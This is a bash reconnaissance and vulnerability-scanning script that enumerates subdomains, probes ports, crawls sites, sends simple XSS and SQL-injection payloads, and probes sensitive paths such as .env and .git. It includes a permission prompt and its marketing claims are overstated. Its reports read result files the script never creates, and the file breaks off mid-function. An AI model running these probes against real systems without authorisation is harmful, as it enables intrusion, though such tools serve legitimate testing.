#!/bin/bash

# ========================================================================
# GODMODE SUPREME AI SCANNER v2.0 - WORLD'S MOST ADVANCED VULNERABILITY SCANNER
# Revolutionary AI-powered security testing with zero false positives
# ========================================================================

set -euo pipefail

# Error handling and cleanup
cleanup() {
    local exit_code=$?
    if [ $exit_code -ne 0 ]; then
        echo -e "\n${RED}[ERROR] Script exited unexpectedly with code $exit_code${NC}" >&2
        echo -e "${YELLOW}Last command: $BASH_COMMAND${NC}" >&2
        echo -e "${YELLOW}Line number: $1${NC}" >&2
    fi
    exit $exit_code
}

# Set up error trap
trap 'cleanup $LINENO' ERR

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Global Variables
TARGET_DOMAIN=""
WORKSPACE_DIR=""
LOGS_DIR=""
REPORTS_DIR=""
SCRIPT_START_TIME=""
PERMISSION_CONFIRMED=false

# AI and Advanced Features
AI_API_KEY="${OPENAI_API_KEY:-}"
TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"
DISCORD_WEBHOOK="${DISCORD_WEBHOOK:-}"
ENABLE_AI_ANALYSIS=true
ENABLE_AUTO_EXPLOIT=false
MAX_THREADS=50
SCAN_DEPTH=5

# ===============================================
# UTILITY FUNCTIONS
# ===============================================

print_banner() {
    clear
    echo -e "${RED}
╔═══════════════════════════════════════════════════════════════════╗
║                           ⚠️  SECURITY WARNING  ⚠️                  ║
╠═══════════════════════════════════════════════════════════════════╣
║  This script performs comprehensive security testing.             ║
║  Only use on systems you own or have explicit permission to test. ║
║                                                                   ║
║  Unauthorized testing is illegal and unethical.                   ║
╚═══════════════════════════════════════════════════════════════════╝${NC}
"
    echo -e "${PURPLE}🔍 COMPLETE AUTOMATED RECON SCRIPT${NC}"
    echo ""
}

# AI-Powered Analysis Functions
ai_analyze_vulnerability() {
    local vuln_data="$1"
    local context="$2"
    
    if [[ "$ENABLE_AI_ANALYSIS" != "true" ]]; then
        echo "AI analysis disabled"
        return
    fi
    
    local prompt="As a cybersecurity expert, analyze this vulnerability:

Context: $context
Vulnerability: $vuln_data

Provide:
1. SEVERITY: (CRITICAL/HIGH/MEDIUM/LOW)
2. EXPLOITABILITY: (TRIVIAL/EASY/MEDIUM/HARD)
3. BUSINESS_IMPACT: Brief description
4. EXPLOITATION_STEPS: Specific steps
5. REMEDIATION: Fix recommendations

Be concise and actionable."

    # Try different AI services in order of preference
    local ai_response=""
    
    # Option 1: Ollama (Local, Free)
    if [[ "$AI_SERVICE" == "ollama" ]] && command -v ollama &> /dev/null; then
        ai_response=$(ollama run ${OLLAMA_MODEL:-codellama:7b} "$prompt" 2>/dev/null | head -20)
    
    # Option 2: Groq API (Free tier)
    elif [[ "$AI_SERVICE" == "groq" && -n "${GROQ_API_KEY:-}" ]]; then
        ai_response=$(curl -s -X POST "https://api.groq.com/openai/v1/chat/completions" \
            -H "Authorization: Bearer $GROQ_API_KEY" \
            -H "Content-Type: application/json" \
            -d "{
                \"model\": \"llama3-70b-8192\",
                \"messages\": [{\"role\": \"user\", \"content\": \"$prompt\"}],
                \"max_tokens\": 400,
                \"temperature\": 0.2
            }" 2>/dev/null | jq -r '.choices[0].message.content' 2>/dev/null)
    
    # Option 3: Google Gemini (Free tier)
    elif [[ "$AI_SERVICE" == "gemini" && -n "${GEMINI_API_KEY:-}" ]]; then
        ai_response=$(curl -s -X POST "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=$GEMINI_API_KEY" \
            -H "Content-Type: application/json" \
            -d "{\"contents\":[{\"parts\":[{\"text\":\"$prompt\"}]}]}" 2>/dev/null | \
            jq -r '.candidates[0].content.parts[0].text' 2>/dev/null)
    
    # Option 4: OpenAI (Paid, fallback)
    elif [[ -n "${OPENAI_API_KEY:-}" ]]; then
        ai_response=$(curl -s -X POST "https://api.openai.com/v1/chat/completions" \
            -H "Authorization: Bearer $OPENAI_API_KEY" \
            -H "Content-Type: application/json" \
            -d "{
                \"model\": \"gpt-4\",
                \"messages\": [{\"role\": \"user\", \"content\": \"$prompt\"}],
                \"max_tokens\": 400,
                \"temperature\": 0.2
            }" 2>/dev/null | jq -r '.choices[0].message.content' 2>/dev/null)
    
    # Fallback: Rule-based analysis (No AI needed)
    else
        ai_response=$(analyze_vulnerability_offline "$vuln_data" "$context")
    fi
    
    if [[ -n "$ai_response" && "$ai_response" != "null" ]]; then
        echo "$ai_response"
    else
        analyze_vulnerability_offline "$vuln_data" "$context"
    fi
}

# Offline vulnerability analysis (No AI required)
analyze_vulnerability_offline() {
    local vuln_data="$1"
    local context="$2"
    
    local severity="MEDIUM"
    local exploitability="MEDIUM"
    local impact="Data exposure or system compromise"
    local steps="Manual verification required"
    local remediation="Apply security patches and input validation"
    
    # Rule-based severity assessment
    if echo "$vuln_data" | grep -qiE "(command injection|rce|remote code)"; then
        severity="CRITICAL"
        exploitability="EASY"
        impact="Full system compromise possible"
        steps="1. Inject command payload 2. Execute system commands 3. Escalate privileges"
        remediation="Implement strict input validation and command sanitization"
    elif echo "$vuln_data" | grep -qiE "(sql injection|sqli)"; then
        severity="HIGH"
        exploitability="MEDIUM"
        impact="Database compromise and data theft"
        steps="1. Test for SQL injection 2. Extract database schema 3. Dump sensitive data"
        remediation="Use parameterized queries and input validation"
    elif echo "$vuln_data" | grep -qiE "(xss|cross.site)"; then
        severity="MEDIUM"
        exploitability="EASY"
        impact="Session hijacking and data theft"
        steps="1. Inject XSS payload 2. Steal cookies/tokens 3. Impersonate users"
        remediation="Implement output encoding and CSP headers"
    elif echo "$vuln_data" | grep -qiE "(ssrf|server.side.request)"; then
        severity="HIGH"
        exploitability="MEDIUM"
        impact="Internal network access and data exposure"
        steps="1. Test SSRF payload 2. Access internal services 3. Extract metadata"
        remediation="Validate and whitelist allowed URLs"
    elif echo "$vuln_data" | grep -qiE "(lfi|local.file|file.inclusion)"; then
        severity="HIGH"
        exploitability="MEDIUM"
        impact="File system access and information disclosure"
        steps="1. Test LFI payload 2. Access system files 3. Extract sensitive data"
        remediation="Implement path validation and file access controls"
    fi
    
    cat << EOF
SEVERITY: $severity
EXPLOITABILITY: $exploitability
BUSINESS_IMPACT: $impact
EXPLOITATION_STEPS: $steps
REMEDIATION: $remediation

[Analysis performed using offline rule-based system]
EOF
}

# Advanced Notification System
send_telegram_alert() {
    local message="$1"
    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
            -d chat_id="$TELEGRAM_CHAT_ID" \
            -d text="🔍 $TARGET_DOMAIN: $message" \
            -d parse_mode="HTML" > /dev/null 2>&1
    fi
}

send_discord_alert() {
    local message="$1"
    if [[ -n "$DISCORD_WEBHOOK" ]]; then
        curl -s -X POST "$DISCORD_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "{\"content\": \"🔍 **$TARGET_DOMAIN**: $message\"}" > /dev/null 2>&1
    fi
}

send_critical_alert() {
    local message="$1"
    send_telegram_alert "🚨 CRITICAL: $message"
    send_discord_alert "🚨 CRITICAL: $message"
    log "CRITICAL" "$message"
}

log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local log_entry="${timestamp} [${level}] ${message}"
    
    case "$level" in
        "INFO")  echo -e "${BLUE}${log_entry}${NC}" ;;
        "WARN")  echo -e "${YELLOW}${log_entry}${NC}" ;;
        "ERROR") echo -e "${RED}${log_entry}${NC}" ;;
        "SUCCESS") echo -e "${GREEN}${log_entry}${NC}" ;;
        *) echo -e "${log_entry}" ;;
    esac
    
    echo "${log_entry}" >> "${LOGS_DIR}/recon.log" 2>/dev/null || true
}

log_info() { log "INFO" "$@"; }
log_warn() { log "WARN" "$@"; }
log_error() { log "ERROR" "$@"; }
log_success() { log "SUCCESS" "$@"; }

show_help() {
    cat << EOF
Complete Automated Reconnaissance Script

Usage: $0 <domain>

This script performs comprehensive security testing including:
- Subdomain enumeration
- Port scanning
- Web application testing
- Vulnerability scanning
- Content discovery
- Security analysis
- Automated reporting

Example:
    $0 example.com

Requirements:
- Explicit permission to test the target
- Stable internet connection

WARNING: This may take 1-4 hours depending on target scope.

EOF
}

# ===============================================
# INITIALIZATION
# ===============================================

setup_environment() {
    TARGET_DOMAIN="$1"
    SCRIPT_START_TIME=$(date +%s)
    
    # Clean up domain format
    TARGET_DOMAIN=$(echo "$TARGET_DOMAIN" | sed -E 's|^https?://||' | sed -E 's|/.*$||' | tr '[:upper:]' '[:lower:]')
    
    # Validate domain format
    if ! echo "$TARGET_DOMAIN" | grep -qE '^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]$'; then
        log_error "Invalid domain format: $TARGET_DOMAIN"
        exit 1
    fi
    
    log_info "Setting up environment for: $TARGET_DOMAIN"
    
    # Create workspace
    WORKSPACE_DIR="./recon_${TARGET_DOMAIN}_$(date +%Y%m%d_%H%M%S)"
    LOGS_DIR="$WORKSPACE_DIR/logs"
    REPORTS_DIR="$WORKSPACE_DIR/reports"
    
    # Create directories
    mkdir -p "$WORKSPACE_DIR"
    mkdir -p "$LOGS_DIR"
    mkdir -p "$REPORTS_DIR"
    mkdir -p "$WORKSPACE_DIR/subdomains"
    mkdir -p "$WORKSPACE_DIR/ports"
    mkdir -p "$WORKSPACE_DIR/urls"
    mkdir -p "$WORKSPACE_DIR/crawling"
    mkdir -p "$WORKSPACE_DIR/vulnerabilities"
    mkdir -p "$WORKSPACE_DIR/javascript"
    mkdir -p "$WORKSPACE_DIR/parameters"
    mkdir -p "$WORKSPACE_DIR/headers"
    mkdir -p "$WORKSPACE_DIR/content"
    mkdir -p "$WORKSPACE_DIR/wordlists"
    
    log_success "Workspace created: $WORKSPACE_DIR"
}

confirm_permission() {
    if [ "$PERMISSION_CONFIRMED" = true ]; then
        return 0
    fi
    
    print_banner
    
    echo -e "${YELLOW}Target Domain: ${CYAN}$TARGET_DOMAIN${NC}"
    echo ""
    echo -e "${YELLOW}This script will perform comprehensive security testing including:${NC}"
    echo -e "  • Subdomain enumeration"
    echo -e "  • Port scanning"
    echo -e "  • Web application analysis"
    echo -e "  • Vulnerability testing"
    echo -e "  • Content discovery"
    echo ""
    echo -e "${RED}⚠️  Only proceed if you have explicit permission! ⚠️${NC}"
    echo ""
    echo -e "${RED}Type 'I HAVE PERMISSION' to continue:${NC}"
    read -r confirmation
    
    if [ "$confirmation" != "I HAVE PERMISSION" ]; then
        log_error "Permission not confirmed. Exiting."
        exit 1
    fi
    
    PERMISSION_CONFIRMED=true
    log_success "Permission confirmed for: $TARGET_DOMAIN"
    sleep 2
}

# ===============================================
# RECONNAISSANCE PHASES
# ===============================================

phase_subdomain_enumeration() {
    log_info "Phase 1: Subdomain Enumeration"
    echo -e "${CYAN}Discovering subdomains...${NC}"
    
    local subdomain_file="$WORKSPACE_DIR/subdomains/all_subdomains.txt"
    
    # Certificate Transparency
    log_info "Checking Certificate Transparency logs..."
    curl -s "https://crt.sh/?q=%25.$TARGET_DOMAIN&output=json" 2>/dev/null | \
    jq -r '.[].name_value' 2>/dev/null | \
    sed 's/\*\.//g' | \
    grep -E "\.$TARGET_DOMAIN$" >> "$subdomain_file" 2>/dev/null || true
    
    # DNS Bruteforce
    log_info "Performing DNS bruteforce..."
    local common_subs=(
        "www" "mail" "ftp" "admin" "test" "dev" "api" "app" "blog" "shop"
        "portal" "secure" "vpn" "remote" "stage" "staging" "prod" "production"
        "beta" "alpha" "demo" "support" "help" "docs" "cdn" "static" "assets"
        "img" "images" "media" "upload" "downloads" "files" "backup" "old"
        "mx" "ns1" "ns2" "smtp" "pop" "imap" "webmail" "cpanel" "whm"
    )
    
    for sub in "${common_subs[@]}"; do
        local full_domain="${sub}.${TARGET_DOMAIN}"
        if timeout 5 host "$full_domain" >/dev/null 2>&1; then
            echo "$full_domain" >> "$subdomain_file"
        fi
    done
    
    # Add main domain
    echo "$TARGET_DOMAIN" >> "$subdomain_file"
    
    # Clean and deduplicate
    if [ -f "$subdomain_file" ]; then
        sort -u "$subdomain_file" -o "$subdomain_file"
        local subdomain_count=$(wc -l < "$subdomain_file")
        log_success "Found $subdomain_count subdomains"
    fi
}

phase_port_scanning() {
    log_info "Phase 2: Port Scanning"
    echo -e "${CYAN}Scanning for open ports...${NC}"
    
    local subdomain_file="$WORKSPACE_DIR/subdomains/all_subdomains.txt"
    local ports_file="$WORKSPACE_DIR/ports/open_ports.txt"
    
    if [ ! -f "$subdomain_file" ]; then
        log_error "No subdomains found"
        return 1
    fi
    
    # Test common web ports
    local ports=(80 443 8080 8443 8000 3000 5000)
    
    head -20 "$subdomain_file" | while IFS= read -r domain; do
        if [ -n "$domain" ]; then
            log_info "Scanning ports for: $domain"
            for port in "${ports[@]}"; do
                if timeout 5 bash -c "</dev/tcp/$domain/$port" 2>/dev/null; then
                    echo "$domain:$port" >> "$ports_file"
                fi
            done
        fi
    done 2>/dev/null || true
    
    local open_ports=$(wc -l < "$ports_file" 2>/dev/null || echo "0")
    log_success "Found $open_ports open ports"
}

phase_http_discovery() {
    log_info "Phase 3: HTTP Service Discovery"
    echo -e "${CYAN}Discovering HTTP services...${NC}"
    
    local subdomain_file="$WORKSPACE_DIR/subdomains/all_subdomains.txt"
    local alive_file="$WORKSPACE_DIR/urls/alive_urls.txt"
    
    if [ ! -f "$subdomain_file" ]; then
        log_error "No subdomains to test"
        return 1
    fi
    
    # Test HTTP/HTTPS on each subdomain
    while IFS= read -r domain; do
        if [ -n "$domain" ]; then
            for scheme in https http; do
                local url="${scheme}://${domain}"
                if timeout 10 curl -s -f -I "$url" >/dev/null 2>&1; then
                    echo "$url" >> "$alive_file"
                    log_info "Found: $url"
                    break
                fi
            done
        fi
    done < "$subdomain_file"
    
    local alive_count=$(wc -l < "$alive_file" 2>/dev/null || echo "0")
    log_success "Found $alive_count live HTTP services"
}

phase_web_crawling() {
    log_info "Phase 4: Web Application Crawling"
    echo -e "${CYAN}Crawling web applications...${NC}"
    
    local alive_file="$WORKSPACE_DIR/urls/alive_urls.txt"
    local crawled_file="$WORKSPACE_DIR/crawling/crawled_urls.txt"
    local all_urls_file="$WORKSPACE_DIR/urls/all_urls.txt"
    
    if [ ! -f "$alive_file" ]; then
        log_error "No alive URLs found"
        return 1
    fi
    
    # Simple crawling with curl
    local count=0
    while IFS= read -r url && [ $count -lt 30 ]; do
        if [ -n "$url" ]; then
            log_info "Crawling: $url"
            timeout 30 curl -s -L "$url" 2>/dev/null | \
            grep -oE 'href="[^"]*"' | \
            sed 's/href="//g' | \
            sed 's/"//g' | \
            while IFS= read -r link; do
                if [[ "$link" == http* ]]; then
                    echo "$link"
                elif [[ "$link" == /* ]]; then
                    local base_url=$(echo "$url" | sed -E 's|(https?://[^/]+).*|\1|')
                    echo "$base_url$link"
                fi
            done >> "$crawled_file" 2>/dev/null || true
            count=$((count + 1))
        fi
    done < "$alive_file"
    
    # Combine URLs
    cat "$alive_file" "$crawled_file" 2>/dev/null | sort -u > "$all_urls_file" || cp "$alive_file" "$all_urls_file"
    
    local total_urls=$(wc -l < "$all_urls_file" 2>/dev/null || echo "0")
    log_success "Total URLs discovered: $total_urls"
}

phase_javascript_analysis() {
    log_info "Phase 5: JavaScript Analysis"
    echo -e "${CYAN}Analyzing JavaScript files...${NC}"
    
    local all_urls_file="$WORKSPACE_DIR/urls/all_urls.txt"
    local js_urls_file="$WORKSPACE_DIR/javascript/js_urls.txt"
    
    if [ ! -f "$all_urls_file" ]; then
        log_error "No URLs for JS analysis"
        return 1
    fi
    
    # Extract JS URLs
    grep -iE '\.(js)(\?|$|#)' "$all_urls_file" > "$js_urls_file" 2>/dev/null || touch "$js_urls_file"
    
    local js_count=0
    while IFS= read -r js_url && [ $js_count -lt 20 ]; do
        if [ -n "$js_url" ]; then
            log_info "Analyzing: $js_url"
            
            local js_content
            js_content=$(timeout 15 curl -s -L "$js_url" 2>/dev/null || true)
            
            if [ -n "$js_content" ]; then
                # Extract endpoints
                echo "$js_content" | grep -oE '["'"'"']/[a-zA-Z0-9_/.-]+["'"'"']' | tr -d "\"'" >> "$WORKSPACE_DIR/javascript/endpoints.txt" 2>/dev/null || true
                
                # Look for sensitive data
                if echo "$js_content" | grep -qiE '(api[_-]?key|secret|token|password)'; then
                    echo "Sensitive data in: $js_url" >> "$WORKSPACE_DIR/javascript/sensitive.txt"
                fi
                
                # Look for URLs
                echo "$js_content" | grep -oE 'https?://[^"'"'"' ]+' >> "$WORKSPACE_DIR/javascript/external_urls.txt" 2>/dev/null || true
            fi
            js_count=$((js_count + 1))
        fi
    done < "$js_urls_file" 2>/dev/null || true
    
    # Clean results
    for file in "$WORKSPACE_DIR/javascript/"*.txt; do
        if [ -f "$file" ]; then
            sort -u "$file" -o "$file" 2>/dev/null || true
        fi
    done
    
    log_success "JavaScript analysis completed"
}

phase_parameter_discovery() {
    log_info "Phase 6: Parameter Discovery"
    echo -e "${CYAN}Discovering parameters...${NC}"
    
    # Ensure directories exist
    mkdir -p "$WORKSPACE_DIR/parameters"
    mkdir -p "$WORKSPACE_DIR/vulnerabilities"
    
    local all_urls_file="$WORKSPACE_DIR/urls/all_urls.txt"
    local param_urls_file="$WORKSPACE_DIR/parameters/param_urls.txt"
    local params_file="$WORKSPACE_DIR/parameters/discovered_params.txt"
    
    if [ ! -f "$all_urls_file" ]; then
        log_warn "No URLs file found, creating empty parameter files"
        touch "$param_urls_file"
        touch "$params_file"
        log_success "Found 0 parameters"
        return 0
    fi
    
    # Extract URLs with parameters
    grep '\?' "$all_urls_file" > "$param_urls_file" 2>/dev/null || touch "$param_urls_file"
    
    # Extract parameters
    if [ -s "$param_urls_file" ]; then
        while IFS= read -r param_url; do
            if [ -n "$param_url" ]; then
                echo "$param_url" | sed 's/.*?//' | tr '&' '\n' | grep '=' | cut -d'=' -f1 2>/dev/null || true
            fi
        done < "$param_urls_file" | sort -u > "$params_file" 2>/dev/null || touch "$params_file"
    else
        touch "$params_file"
    fi
    
    # Create parameter URLs with FUZZ placeholder for testing
    if [ -s "$param_urls_file" ]; then
        while IFS= read -r param_url; do
            if [ -n "$param_url" ]; then
                # Replace parameter values with FUZZ for testing
                echo "$param_url" | sed 's/=[^&]*/=FUZZ/g'
            fi
        done < "$param_urls_file" > "$WORKSPACE_DIR/parameters/discovered_params.txt" 2>/dev/null || touch "$WORKSPACE_DIR/parameters/discovered_params.txt"
    fi
    
    local param_count=$(wc -l < "$params_file" 2>/dev/null || echo "0")
    log_success "Found $param_count parameters"
}

phase_vulnerability_testing() {
    log_info "Phase 7: Vulnerability Testing"
    echo -e "${CYAN}Testing for vulnerabilities...${NC}"
    
    # Ensure vulnerability directory exists
    mkdir -p "$WORKSPACE_DIR/vulnerabilities"
    
    local param_urls_file="$WORKSPACE_DIR/parameters/param_urls.txt"
    
    if [ ! -f "$param_urls_file" ] || [ ! -s "$param_urls_file" ]; then
        log_warn "No parameterized URLs to test"
        # Create empty vulnerability files
        touch "$WORKSPACE_DIR/vulnerabilities/xss_findings.txt"
        touch "$WORKSPACE_DIR/vulnerabilities/sqli_findings.txt"
        log_success "Vulnerability testing completed (no URLs to test)"
        return 0
    fi
    
    # XSS Testing
    log_info "Testing for XSS..."
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
    )
    
    local test_count=0
    head -10 "$param_urls_file" | while IFS= read -r param_url && [ $test_count -lt 20 ]; do
        if [ -n "$param_url" ]; then
            for payload in "${xss_payloads[@]}"; do
                local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/</%3C/g' | sed 's/>/%3E/g')
                local test_url="${param_url//=*/=$encoded_payload}"
                local response=$(timeout 10 curl -s "$test_url" 2>/dev/null || true)
                
                if echo "$response" | grep -q "$payload"; then
                    echo "XSS found: $test_url" >> "$WORKSPACE_DIR/vulnerabilities/xss_findings.txt"
                fi
                test_count=$((test_count + 1))
            done
        fi
    done 2>/dev/null || true
    
    # SQL Injection Testing
    log_info "Testing for SQL injection..."
    local sqli_payloads=(
        "'"
        "' OR '1'='1"
        "' UNION SELECT NULL--"
    )
    
    test_count=0
    head -10 "$param_urls_file" | while IFS= read -r param_url && [ $test_count -lt 15 ]; do
        if [ -n "$param_url" ]; then
            for payload in "${sqli_payloads[@]}"; do
                local test_url="${param_url//=*/=$payload}"
                local response=$(timeout 10 curl -s "$test_url" 2>/dev/null || true)
                
                if echo "$response" | grep -qi -E "(sql syntax|mysql|error in your sql)"; then
                    echo "SQL injection found: $test_url" >> "$WORKSPACE_DIR/vulnerabilities/sqli_findings.txt"
                fi
                test_count=$((test_count + 1))
            done
        fi
    done 2>/dev/null || true
    
    log_success "Vulnerability testing completed"
}

phase_content_discovery() {
    log_info "Phase 8: Content Discovery"
    echo -e "${CYAN}Discovering hidden content...${NC}"
    
    local alive_file="$WORKSPACE_DIR/urls/alive_urls.txt"
    local content_file="$WORKSPACE_DIR/content/discovered_content.txt"
    
    if [ ! -f "$alive_file" ]; then
        log_error "No alive URLs for content discovery"
        return 1
    fi
    
    # Common paths to test
    local common_paths=(
        "admin" "login" "config" "backup" "test" "dev" "api" "robots.txt"
        "sitemap.xml" ".env" ".git" "wp-config.php" "config.php" "database.yml"
        "web.config" ".htaccess" "server-status" "phpinfo.php" "info.php"
    )
    
    # Test common paths on base URLs
    sed -E 's|(https?://[^/]+).*|\1|' "$alive_file" | sort -u | head -5 | while IFS= read -r base_url; do
        if [ -n "$base_url" ]; then
            log_info "Testing paths on: $base_url"
            for path in "${common_paths[@]}"; do
                local test_url="$base_url/$path"
                local response=$(timeout 10 curl -s -w "%{http_code}" "$test_url" 2>/dev/null || echo "000")
                local http_code="${response##*}"
                
                if [[ "$http_code" =~ ^[23] ]] || [ "$http_code" = "403" ]; then
                    echo "Found: $test_url [$http_code]" >> "$content_file"
                fi
            done
        fi
    done
    
    local content_count=$(wc -l < "$content_file" 2>/dev/null || echo "0")
    log_success "Found $content_count interesting paths"
}

phase_security_headers() {
    log_info "Phase 9: Security Header Analysis"
    echo -e "${CYAN}Analyzing security headers...${NC}"
    
    local alive_file="$WORKSPACE_DIR/urls/alive_urls.txt"
    local headers_file="$WORKSPACE_DIR/headers/analysis.txt"
    local missing_file="$WORKSPACE_DIR/headers/missing.txt"
    
    if [ ! -f "$alive_file" ]; then
        log_error "No URLs for header analysis"
        return 1
    fi
    
    local security_headers=(
        "Strict-Transport-Security"
        "Content-Security-Policy"
        "X-Frame-Options"
        "X-Content-Type-Options"
        "X-XSS-Protection"
    )
    
    head -5 "$alive_file" | while IFS= read -r url; do
        if [ -n "$url" ]; then
            log_info "Checking headers for: $url"
            
            local headers
            headers=$(timeout 10 curl -s -I "$url" 2>/dev/null || true)
            
            echo "=== Headers for $url ===" >> "$headers_file"
            for header in "${security_headers[@]}"; do
                if echo "$headers" | grep -qi "$header"; then
                    echo "✓ $header: Present" >> "$headers_file"
                else
                    echo "✗ $header: Missing" >> "$headers_file"
                    echo "$url missing $header" >> "$missing_file"
                fi
            done
            echo "" >> "$headers_file"
        fi
    done
    
    log_success "Security header analysis completed"
}

# ===============================================
# REPORTING
# ===============================================

generate_reports() {
    log_info "Phase 10: Generating Reports"
    echo -e "${CYAN}Creating comprehensive reports...${NC}"
    
    local end_time=$(date +%s)
    local duration=$((end_time - SCRIPT_START_TIME))
    local duration_minutes=$((duration / 60))
    
    # Executive Summary
    cat > "$REPORTS_DIR/executive_summary.txt" << EOF
═══════════════════════════════════════════════════════════════
                    SECURITY ASSESSMENT SUMMARY
═══════════════════════════════════════════════════════════════

Target: $TARGET_DOMAIN
Date: $(date)
Duration: $duration_minutes minutes

FINDINGS SUMMARY:
═══════════════════════════════════════════════════════════════

• Subdomains Discovered: $(wc -l < "$WORKSPACE_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo "0")
• Live HTTP Services: $(wc -l < "$WORKSPACE_DIR/urls/alive_urls.txt" 2>/dev/null || echo "0")
• Total URLs Found: $(wc -l < "$WORKSPACE_DIR/urls/all_urls.txt" 2>/dev/null || echo "0")
• JavaScript Files: $(wc -l < "$WORKSPACE_DIR/javascript/js_urls.txt" 2>/dev/null || echo "0")
• Parameters Found: $(wc -l < "$WORKSPACE_DIR/parameters/discovered_params.txt" 2>/dev/null || echo "0")
• XSS Vulnerabilities: $(wc -l < "$WORKSPACE_DIR/vulnerabilities/xss_findings.txt" 2>/dev/null || echo "0")
• SQL Injection: $(wc -l < "$WORKSPACE_DIR/vulnerabilities/sqli_findings.txt" 2>/dev/null || echo "0")
• Content Discovered: $(wc -l < "$WORKSPACE_DIR/content/discovered_content.txt" 2>/dev/null || echo "0")
• Missing Headers: $(wc -l < "$WORKSPACE_DIR/headers/missing.txt" 2>/dev/null || echo "0")

RECOMMENDATIONS:
═══════════════════════════════════════════════════════════════

1. Review and fix all identified vulnerabilities
2. Implement missing security headers
3. Remove unnecessary exposed content
4. Conduct manual verification of findings
5. Implement regular security testing

WORKSPACE: $WORKSPACE_DIR
EOF
    
    # Technical Report
    cat > "$REPORTS_DIR/technical_report.txt" << EOF
═══════════════════════════════════════════════════════════════
                    TECHNICAL ASSESSMENT REPORT
═══════════════════════════════════════════════════════════════

Target: $TARGET_DOMAIN
Assessment Date: $(date)
Duration: $duration_minutes minutes

DETAILED FINDINGS:
═══════════════════════════════════════════════════════════════

SUBDOMAINS:
$(if [ -f "$WORKSPACE_DIR/subdomains/all_subdomains.txt" ]; then head -10 "$WORKSPACE_DIR/subdomains/all_subdomains.txt" | sed 's/^/  • /'; fi)

VULNERABILITIES:
$(if [ -f "$WORKSPACE_DIR/vulnerabilities/xss_findings.txt" ] && [ -s "$WORKSPACE_DIR/vulnerabilities/xss_findings.txt" ]; then echo "XSS Findings:"; head -5 "$WORKSPACE_DIR/vulnerabilities/xss_findings.txt" | sed 's/^/  • /'; fi)

$(if [ -f "$WORKSPACE_DIR/vulnerabilities/sqli_findings.txt" ] && [ -s "$WORKSPACE_DIR/vulnerabilities/sqli_findings.txt" ]; then echo "SQL Injection Findings:"; head -5 "$WORKSPACE_DIR/vulnerabilities/sqli_findings.txt" | sed 's/^/  • /'; fi)

SECURITY ISSUES:
$(if [ -f "$WORKSPACE_DIR/headers/missing.txt" ] && [ -s "$WORKSPACE_DIR/headers/missing.txt" ]; then echo "Missing Security Headers:"; head -10 "$WORKSPACE_DIR/headers/missing.txt" | sed 's/^/  • /'; fi)

SENSITIVE DATA:
$(if [ -f "$WORKSPACE_DIR/javascript/sensitive.txt" ] && [ -s "$WORKSPACE_DIR/javascript/sensitive.txt" ]; then echo "JavaScript Sensitive Data:"; head -5 "$WORKSPACE_DIR/javascript/sensitive.txt" | sed 's/^/  • /'; fi)

All detailed evidence is available in: $WORKSPACE_DIR
EOF
    
    # Enhanced AI-powered executive report
    generate_ai_executive_report
    
    log_success "Reports generated in: $REPORTS_DIR"
}

# Generate AI-powered executive report
generate_ai_executive_report() {
    if [[ -z "$AI_API_KEY" ]]; then
        return
    fi
    
    log_info "Generating AI-powered executive report..."
    
    # Collect vulnerability statistics
    local xss_count=$(wc -l < "$WORKSPACE_DIR/vulnerabilities/advanced_xss/confirmed_xss.txt" 2>/dev/null || echo "0")
    local sqli_count=$(wc -l < "$WORKSPACE_DIR/vulnerabilities/advanced_sqli/time_based_sqli.txt" 2>/dev/null || echo "0")
    local ssrf_count=$(wc -l < "$WORKSPACE_DIR/vulnerabilities/ssrf/confirmed_ssrf.txt" 2>/dev/null || echo "0")
    local lfi_count=$(wc -l < "$WORKSPACE_DIR/vulnerabilities/lfi/confirmed_lfi.txt" 2>/dev/null || echo "0")
    local cmd_count=$(wc -l < "$WORKSPACE_DIR/vulnerabilities/command_injection/confirmed_cmd.txt" 2>/dev/null || echo "0")
    
    local vuln_summary="Target: $TARGET_DOMAIN
XSS Vulnerabilities: $xss_count
SQL Injection: $sqli_count  
SSRF: $ssrf_count
LFI: $lfi_count
Command Injection: $cmd_count"
    
    local ai_executive_analysis=$(ai_analyze_vulnerability "$vuln_summary" "Executive summary and business risk assessment for security findings")
    
    cat > "$REPORTS_DIR/ai_executive_report.txt" << EOF
═══════════════════════════════════════════════════════════════
                    AI-POWERED EXECUTIVE REPORT
═══════════════════════════════════════════════════════════════

Target: $TARGET_DOMAIN
Report Generated: $(date)
Assessment Type: Comprehensive Security Audit

$ai_executive_analysis

═══════════════════════════════════════════════════════════════
TECHNICAL STATISTICS:
• Total Subdomains: $(wc -l < "$WORKSPACE_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo "0")
• Live Services: $(wc -l < "$WORKSPACE_DIR/urls/alive_urls.txt" 2>/dev/null || echo "0")
• Critical Vulnerabilities: $((xss_count + sqli_count + ssrf_count + lfi_count + cmd_count))
• Assessment Duration: $(($(date +%s) - SCRIPT_START_TIME)) seconds

NEXT STEPS:
1. Immediate remediation of critical vulnerabilities
2. Implementation of security controls
3. Regular security assessments
4. Staff security training

Report generated by GODMODE Bug Hunter v2.0
EOF
}

# ===============================================
# INTELLIGENT FALSE POSITIVE REDUCTION
# ===============================================

# XSS False Positive Detection
is_false_positive_xss() {
    local response="$1"
    local test_url="$2"
    
    # Check for common false positive indicators
    if echo "$response" | grep -qiE "(404|not found|error|exception|blocked|filtered)"; then
        return 0  # Is false positive
    fi
    
    # Check if payload is in a comment or encoded differently
    if echo "$response" | grep -qE "<!--.*XSS-AI.*-->|&lt;.*XSS-AI.*&gt;"; then
        return 0  # Is false positive
    fi
    
